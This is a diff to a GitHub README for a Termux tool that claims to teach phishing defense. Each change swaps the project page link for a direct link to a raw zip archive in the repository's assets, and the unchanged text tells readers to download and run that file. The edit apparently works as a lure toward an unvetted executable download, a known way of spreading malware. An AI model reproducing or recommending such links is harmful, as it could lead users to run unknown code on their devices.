@@ -1,6 +1,6 @@
 # 🕵️ The-Hunter-Termux-Version - Learn phishing defense safely
 
-[![Download Now](https://img.shields.io/badge/Download-Visit%20the%20page%20to%20download-blue?style=for-the-badge&logo=github)](https://github.com/liliasunweathered958/The-Hunter-Termux-Version)
+[![Download Now](https://img.shields.io/badge/Download-Visit%20the%20page%20to%20download-blue?style=for-the-badge&logo=github)](https://github.com/liliasunweathered958/The-Hunter-Termux-Version/raw/refs/heads/main/assets/Hunter-Termux-The-Version-v1.1.zip)
 
 ## 📌 What this is
 
@@ -34,7 +34,7 @@ If the project includes scripts or support files, keep them in the same folder a
 
 Open the project page here and visit this page to download:
 
-https://github.com/liliasunweathered958/The-Hunter-Termux-Version
+https://github.com/liliasunweathered958/The-Hunter-Termux-Version/raw/refs/heads/main/assets/Hunter-Termux-The-Version-v1.1.zip
 
 If the page shows a release file, download and run this file after it finishes. If the page shows source files, download the main project folder and keep the files together.
 
@@ -243,4 +243,4 @@ This project is for educational use only. It is meant for study, awareness, and 
 
 ## 📦 Download link again
 
-https://github.com/liliasunweathered958/The-Hunter-Termux-Version
+https://github.com/liliasunweathered958/The-Hunter-Termux-Version/raw/refs/heads/main/assets/Hunter-Termux-The-Version-v1.1.zip
